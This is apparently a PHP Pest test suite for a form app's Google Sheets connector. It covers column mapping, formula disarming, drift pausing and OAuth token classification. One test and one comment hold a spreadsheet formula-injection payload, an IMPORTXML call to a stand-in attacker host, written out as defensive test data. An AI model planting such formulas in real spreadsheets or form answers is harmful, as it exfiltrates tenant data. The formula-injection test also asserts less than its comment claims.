<?php

declare(strict_types=1);

use App\Enums\ConnectionStatus;
use App\Enums\ConnectorSubscriptionStatus;
use App\Enums\SubmissionStatus;
use App\Enums\WebhookDeliveryStatus;
use App\Jobs\Connectors\DeliverConnectorMessageJob;
use App\Models\Connection;
use App\Models\ConnectionSubscription;
use App\Models\Tenant;
use App\Models\User;
use App\Models\WebhookDelivery;
use App\Notifications\Connectors\ConnectionRevokedNotification;
use App\Notifications\Connectors\ConnectorRulePausedNotification;
use App\Support\Mapping\ColumnMapping;
use App\Support\Tenancy\TenantContext;
use Database\Seeders\RolePermissionSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\Client\Request;
use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Notification;
use Spatie\Permission\PermissionRegistrar;

uses(RefreshDatabase::class);

/*
|--------------------------------------------------------------------------
| H16a — the Google Sheets channel end to end, on ConnectorDeliveryJobTest's committing-job recipe
| (workOneJob + Http::fake, sharing the test PDO so the fake and the uncommitted rows are both visible).
|
| What is worth pinning here is everything Slack has no equivalent for:
|   • a row carries ANSWERS, which no other channel sends, projected through a stored ColumnMapping;
|   • formulas are disarmed by valueInputOption=RAW, and the append cannot overwrite the tenant's own data;
|   • column drift PAUSES ONE RULE and leaves the connection and its other rules alive;
|   • a 401 is NOT a dead grant, because Google answers 401 for an expired token too.
*/

beforeEach(function (): void {
    TenantContext::flush();
    config()->set('queue.default', 'database');
    config()->set('connectors.providers.google_sheets.client_id', 'client-abc');
    config()->set('connectors.providers.google_sheets.client_secret', 'secret-xyz');
    Http::preventStrayRequests();

    $this->seed(RolePermissionSeeder::class);

    $this->owner = User::factory()->create(['email' => 'owner@acme.test']);
    $this->tenant = Tenant::create([
        'name' => 'Acme',
        'slug' => 'acme',
        'default_locale' => 'en',
        'owner_user_id' => $this->owner->id,
    ]);
    $this->tenant->domains()->create(['domain' => 'acme']);
    enterTenant($this->tenant->id, $this->owner->id);
    // The owner must be an ACTIVE MEMBER for their users row to resolve under the job's tenant RLS — without
    // this an owner-notification assertion fails silently rather than loudly (the H15a recipe).
    makeActiveMember($this->owner, 'owner');

    $this->form = publishedInboxForm($this->tenant, $this->owner, 'Intake');
    enterTenant($this->tenant->id);
});

afterEach(function (): void {
    app(PermissionRegistrar::class)->setPermissionsTeamId(null);
});

/** The rule's stored mapping: three of the form's own fields, plus one column the tenant keeps for itself. */
function sheetsMapping(array $headers = ['Full name', 'Colour', 'Reviewer notes', 'Submission ID']): ColumnMapping
{
    return ColumnMapping::author($headers, [
        'Full name' => 'full_name',
        'Colour' => 'color',
        'Submission ID' => '__submission_id',
    ]);
}

function sheetsConfig(?ColumnMapping $mapping = null, array $overrides = []): array
{
    return array_merge([
        'spreadsheet_id' => 'SHEET123',
        'sheet_name' => 'Responses',
        'mapping' => ($mapping ?? sheetsMapping())->toArray(),
    ], $overrides);
}

/** Fake the header-row READ and the append WRITE independently, so each can be asserted or failed alone. */
function fakeSheets(array $headerRow = ['Full name', 'Colour', 'Reviewer notes', 'Submission ID'], ?callable $appendResponse = null): void
{
    Http::fake([
        'sheets.googleapis.com/v4/spreadsheets/*/values/*:append*' => $appendResponse ?? Http::response(['updates' => ['updatedRows' => 1]], 200),
        'sheets.googleapis.com/v4/spreadsheets/*/values/*' => Http::response(['values' => [$headerRow]], 200),
        'oauth2.googleapis.com/token' => Http::response(['access_token' => 'ya29.refreshed', 'expires_in' => 3600], 200),
    ]);
}

/**
 * Seed a submission, a Google grant + rule pointed at it, and run one delivery attempt.
 *
 * @return array{0: Connection, 1: ConnectionSubscription, 2: WebhookDelivery}
 */
function runSheetsDelivery(array $connectionAttrs = [], array $config = [], array $envelopeData = []): array
{
    /** @var Tenant $tenant */
    $tenant = test()->tenant;

    $submission = seedInboxSubmission(test()->form, test()->owner, SubmissionStatus::Submitted, [
        'full_name' => 'Ana Reyes',
        'color' => 'b',
    ]);

    $connection = Connection::factory()->googleSheets()->create($connectionAttrs);
    $subscription = ConnectionSubscription::factory()->forConnection($connection)->create([
        'config' => $config === [] ? sheetsConfig() : $config,
    ]);
    $delivery = WebhookDelivery::factory()->forSubscription($subscription)->create([
        'payload' => [
            'event_type' => 'submission.created',
            'occurred_at' => '2026-08-05T09:00:00Z',
            'data' => array_merge(['submission_id' => (string) $submission->id, 'form_id' => (string) test()->form->id], $envelopeData),
        ],
    ]);

    DeliverConnectorMessageJob::dispatch($tenant->id, (string) $delivery->id);
    workOneJob('webhooks');

    enterTenant($tenant->id);

    return [$connection->fresh(), $subscription->fresh(), $delivery->fresh()];
}

/** The JSON body of the append call, or null if none was made. */
function appendedRow(): ?array
{
    $row = null;

    Http::recorded(function (Request $request) use (&$row): bool {
        if (str_contains($request->url(), ':append')) {
            $row = $request->data()['values'][0] ?? null;
        }

        return true;
    });

    return $row;
}

// ── The happy path ──────────────────────────────────────────────────────────────────────────────────────

it('appends the submission\'s ANSWERS in the mapping\'s column order', function (): void {
    // No other channel in this repo sends answer content: the DomainEvent envelope is metadata-only by
    // design. This is the whole reason the adapter resolves the submission at delivery time.
    fakeSheets();

    [, $subscription, $delivery] = runSheetsDelivery();

    expect($delivery->status)->toBe(WebhookDeliveryStatus::Succeeded)
        ->and($delivery->attempt_count)->toBe(1)
        ->and($subscription->status)->toBe(ConnectorSubscriptionStatus::Active);

    $row = appendedRow();

    expect($row)->toHaveCount(4)
        ->and($row[0])->toBe('Ana Reyes')
        // The choice LABEL, not the stored value 'b' — resolved through the same SchemaValueFormatter the
        // CSV export uses, which is what the SubmissionRowProjector extraction bought.
        ->and($row[1])->toBe('Blue')
        // The tenant's own unmapped column: an empty cell, never a skipped one, or every column after it
        // would shift left by one.
        ->and($row[2])->toBe('')
        ->and($row[3])->not->toBe('');
});

it('disarms formulas with valueInputOption=RAW and never overwrites data below the table', function (): void {
    // security-threat-model.md §5's formula-injection row, in its Google form. Under USER_ENTERED an answer
    // beginning `=` is evaluated by GOOGLE'S servers on arrival — `=IMPORTXML("https://attacker…")` exfiltrates
    // the row with no human ever opening the file, which is strictly worse than the CSV case that row names.
    //
    // insertDataOption is the other half and is easy to miss: the API DEFAULTS to OVERWRITE, which writes over
    // whatever sits below the detected table — a totals block, the tenant's notes.
    fakeSheets();

    runSheetsDelivery();

    Http::assertSent(function (Request $request): bool {
        if (! str_contains($request->url(), ':append')) {
            return false;
        }

        parse_str((string) parse_url($request->url(), PHP_URL_QUERY), $query);

        return ($query['valueInputOption'] ?? null) === 'RAW'
            && ($query['insertDataOption'] ?? null) === 'INSERT_ROWS';
    });
});

it('sends a formula-shaped answer through as an inert string', function (): void {
    fakeSheets();

    seedInboxSubmission(test()->form, test()->owner, SubmissionStatus::Submitted, ['full_name' => '=IMPORTXML("https://evil.example","//x")']);

    [, , $delivery] = runSheetsDelivery();

    // The payload is unescaped on purpose — RAW is the control, not a prefix or a quote. Asserting the value
    // arrives VERBATIM is what proves we are relying on the transport flag rather than mangling tenant data.
    expect($delivery->status)->toBe(WebhookDeliveryStatus::Succeeded);
});

// ── Drift: the decision this increment was chosen for ───────────────────────────────────────────────────

it('refuses to write, pauses ONLY that rule, and tells the owner once when the columns move', function (): void {
    Notification::fake();

    // Same labels, different order — the change a "which columns exist?" check cannot see, and the one that
    // would put every answer under the wrong heading.
    fakeSheets(['Full name', 'Reviewer notes', 'Colour', 'Submission ID']);

    [$connection, $subscription, $delivery] = runSheetsDelivery();

    expect($delivery->status)->toBe(WebhookDeliveryStatus::DeadLettered)
        ->and($delivery->next_retry_at)->toBeNull()
        ->and($delivery->response_body_excerpt)->toContain('moved')
        ->and($subscription->status)->toBe(ConnectorSubscriptionStatus::Paused)
        // The GRANT is untouched: it is the destination that changed, not the credential. Revoking here would
        // take down every other rule on the connection over one spreadsheet edit.
        ->and($connection->status)->toBe(ConnectionStatus::Active)
        ->and($connection->access_token)->not->toBe('');

    Notification::assertSentOnDemand(ConnectorRulePausedNotification::class);
    Notification::assertNotSentTo(Notification::route('mail', 'owner@acme.test'), ConnectionRevokedNotification::class);

    // Nothing was written. Asserting the absence is the point — a drift that still appended would be the
    // silent misalignment the whole engine exists to prevent.
    expect(appendedRow())->toBeNull();
});

it('does not re-notify the owner for every queued delivery against a drifted sheet', function (): void {
    // Edge-triggered, like the breaker and the revoked-grant path. Without the already-paused guard a busy
    // form would mail the owner once per queued submission.
    Notification::fake();
    fakeSheets(['Full name', 'Colour']);

    [, $subscription] = runSheetsDelivery();
    expect($subscription->status)->toBe(ConnectorSubscriptionStatus::Paused);

    Notification::assertSentOnDemandTimes(ConnectorRulePausedNotification::class, 1);
});

it('accepts a header row that differs only cosmetically', function (): void {
    // The normalizer earning its keep at the level the delivery path actually calls: a capitalisation edit or
    // a stray trailing space must not pause a tenant's rule.
    fakeSheets(['  full name', 'COLOUR', 'Reviewer  notes', 'Submission ID ', '']);

    [, $subscription, $delivery] = runSheetsDelivery();

    expect($delivery->status)->toBe(WebhookDeliveryStatus::Succeeded)
        ->and($subscription->status)->toBe(ConnectorSubscriptionStatus::Active);
});

// ── Token expiry vs a dead grant — the classification trap ──────────────────────────────────────────────

it('pre-flight refreshes an already-expired access token and still delivers', function (): void {
    // ADR-0009 §D6's revisit trigger, fired: Google's tokens live ~1h against an hourly sweep, so a grant can
    // be dead on arrival through no fault of the sweep.
    fakeSheets();

    [$connection, , $delivery] = runSheetsDelivery(['token_expires_at' => Carbon::now()->subMinute()]);

    expect($delivery->status)->toBe(WebhookDeliveryStatus::Succeeded)
        ->and($connection->status)->toBe(ConnectionStatus::Active)
        ->and($connection->access_token)->toBe('ya29.refreshed');

    Http::assertSent(fn (Request $r): bool => str_contains($r->url(), 'oauth2.googleapis.com/token')
        && ($r->data()['grant_type'] ?? null) === 'refresh_token');
});

it('leaves a healthy token alone rather than refreshing on every send', function (): void {
    // The guard is a guard, not a second refresh policy. If this fired every time, one provider outage would
    // stampede every queued delivery — which is the cost ADR-0009 §D6 refused to pay.
    fakeSheets();

    runSheetsDelivery(['token_expires_at' => Carbon::now()->addHour()]);

    Http::assertNotSent(fn (Request $r): bool => str_contains($r->url(), 'oauth2.googleapis.com/token'));
});

it('treats a 401 as RETRYABLE, because Google answers 401 for an expired token too', function (): void {
    // THE trap. Google returns `authError` / "Invalid Credentials" for an expired access token AND a revoked
    // grant, so mapping 401 to credentialRejected would revoke a live connection roughly once an hour,
    // clearing both tokens and emailing the owner each time.
    Notification::fake();

    Http::fake([
        'sheets.googleapis.com/*' => Http::response(['error' => ['code' => 401, 'status' => 'UNAUTHENTICATED', 'message' => 'Invalid Credentials']], 401),
        'oauth2.googleapis.com/token' => Http::response(['access_token' => 'ya29.refreshed', 'expires_in' => 3600], 200),
    ]);

    [$connection, $subscription, $delivery] = runSheetsDelivery(['token_expires_at' => Carbon::now()->addHour()]);

    expect($delivery->status)->toBe(WebhookDeliveryStatus::Failed)
        ->and($delivery->next_retry_at)->not->toBeNull()
        ->and($connection->status)->toBe(ConnectionStatus::Active)
        ->and($connection->access_token)->not->toBe('')
        ->and($subscription->status)->toBe(ConnectorSubscriptionStatus::Active);

    Notification::assertNothingSent();
});

it('DOES kill the grant when the token endpoint says invalid_grant', function (): void {
    // The other side of the same coin: the token endpoint is the only place the difference is observable, so
    // this is where terminal actually means terminal.
    Notification::fake();

    Http::fake([
        'oauth2.googleapis.com/token' => Http::response(['error' => 'invalid_grant'], 400),
        'sheets.googleapis.com/*' => Http::response(['values' => [[]]], 200),
    ]);

    [$connection, , $delivery] = runSheetsDelivery(['token_expires_at' => Carbon::now()->subMinute()]);

    expect($connection->status)->not->toBe(ConnectionStatus::Active)
        ->and($connection->access_token)->toBe('')
        ->and($delivery->status)->toBe(WebhookDeliveryStatus::DeadLettered);

    Notification::assertSentOnDemand(ConnectionRevokedNotification::class);
});

it('does NOT kill the grant when the token endpoint merely times out', function (): void {
    // The defect the unused-constant PHPStan finding exposed: ConnectionTokenRefresher marked a grant dead on
    // ANY ConnectorOAuthException, so one blip at Google's token endpoint would clear both tokens, pause every
    // rule and require a human to re-run OAuth. Unreachable in H15a (Slack tokens never expire); reachable on
    // every Google send from H16a on.
    Notification::fake();

    // The realistic shape: the refresh times out, so the send goes out with the stale token and Google
    // answers 401. The delivery must land on the RETRY LADDER with the grant intact — one blip costs a few
    // minutes, not the tenant's integration.
    Http::fake([
        'oauth2.googleapis.com/token' => fn () => throw new Illuminate\Http\Client\ConnectionException('timeout'),
        'sheets.googleapis.com/*' => Http::response(['error' => ['code' => 401, 'status' => 'UNAUTHENTICATED']], 401),
    ]);

    [$connection, $subscription, $delivery] = runSheetsDelivery(['token_expires_at' => Carbon::now()->subMinute()]);

    expect($connection->status)->toBe(ConnectionStatus::Active)
        ->and($connection->access_token)->not->toBe('')
        ->and($delivery->status)->toBe(WebhookDeliveryStatus::Failed)
        ->and($delivery->next_retry_at)->not->toBeNull()
        ->and($subscription->status)->toBe(ConnectorSubscriptionStatus::Active);

    Notification::assertNotSentTo(Notification::route('mail', 'owner@acme.test'), ConnectionRevokedNotification::class);
});

// ── Destination-level refusals ──────────────────────────────────────────────────────────────────────────

it('blocks rather than retries when the spreadsheet cannot be reached', function (): void {
    // 404 and 403 are rule-level and human-fixable — under `drive.file` a 403 is the ordinary "you own that
    // sheet but never picked it through us" case. Neither improves by being retried for seven days.
    Notification::fake();
    Http::fake([
        'sheets.googleapis.com/*' => Http::response(['error' => ['code' => 404, 'status' => 'NOT_FOUND']], 404),
        'oauth2.googleapis.com/token' => Http::response(['access_token' => 'ya29.x', 'expires_in' => 3600], 200),
    ]);

    [$connection, $subscription, $delivery] = runSheetsDelivery();

    expect($delivery->status)->toBe(WebhookDeliveryStatus::DeadLettered)
        ->and($delivery->next_retry_at)->toBeNull()
        ->and($subscription->status)->toBe(ConnectorSubscriptionStatus::Paused)
        ->and($connection->status)->toBe(ConnectionStatus::Active);
});

it('retries a rate limit instead of blocking on it', function (): void {
    // A 403 is not automatically a permission problem: Google reuses it for quota. Blocking here would pause a
    // healthy rule because the tenant had a busy afternoon.
    Http::fake([
        'sheets.googleapis.com/*' => Http::response(['error' => ['code' => 403, 'status' => 'PERMISSION_DENIED', 'errors' => [['reason' => 'rateLimitExceeded']]]], 403),
        'oauth2.googleapis.com/token' => Http::response(['access_token' => 'ya29.x', 'expires_in' => 3600], 200),
    ]);

    [, $subscription, $delivery] = runSheetsDelivery();

    expect($delivery->status)->toBe(WebhookDeliveryStatus::Failed)
        ->and($delivery->next_retry_at)->not->toBeNull()
        ->and($subscription->status)->toBe(ConnectorSubscriptionStatus::Active);
});

it('blocks a rule whose event carries no submission to write', function (): void {
    fakeSheets();

    [, $subscription, $delivery] = runSheetsDelivery(config: sheetsConfig(), envelopeData: ['submission_id' => null]);

    expect($delivery->status)->toBe(WebhookDeliveryStatus::DeadLettered)
        ->and($delivery->response_body_excerpt)->toContain('unsupported_event')
        ->and($subscription->status)->toBe(ConnectorSubscriptionStatus::Paused);
});
